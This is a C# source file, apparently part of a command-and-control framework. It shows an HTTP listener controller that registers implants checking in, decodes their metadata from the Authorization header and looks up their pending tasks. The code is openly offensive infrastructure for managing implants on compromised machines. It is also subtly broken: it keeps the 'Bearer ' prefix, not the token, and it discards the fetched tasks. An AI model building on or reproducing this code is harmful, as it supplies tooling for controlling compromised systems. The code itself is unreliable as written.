using Maragi_Framework.Models.Agent_Implants;
using Maragi_Framework.Services;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using System;
using System.Text;
using Newtonsoft.Json;


namespace Maragi_Framework.Models.Listeners
{
    [Controller]
    // Whenever Controller is called it automatically do "<Protocol-Listener> + Controller"
    public class HttpListenerController : ControllerBase
    {
        private readonly IAgentService _agents;

        public HttpListenerController(IAgentService agents)
        {
            _agents = agents;
        }

        public IActionResult HandleImplant()
        {
            var metadata = ExtractMetadata(HttpContext.Request.Headers);
            if (metadata is null) return NotFound();

            // if metadata not null we want to get an instance of the agent
            var agent = _agents.GetAgent(metadata.Id);
            if (agent is null)
            {
                agent = new Agent(metadata);
                _agents.AddAgent(agent);
            }

            var tasks = agent.GetPendingtask();

            return Ok("Listener Works");
        }

        // How do TeamServer know what it is interaccting with (defender , web scapper , external tools)
        private AgentMetadata ExtractMetadata(IHeaderDictionary headers) {

            // if no header call Authorization , return null
            if (!headers.TryGetValue("Authorization", out var encodedMetadata))
                return null;

            // header is going to say Authorization: Bearer <content>
            encodedMetadata = encodedMetadata.ToString().Substring(0, 7);

            var json = Encoding.UTF8.GetString(Convert.FromBase64String(encodedMetadata));

            return JsonConvert.DeserializeObject<AgentMetadata>(json);
        }
    }
}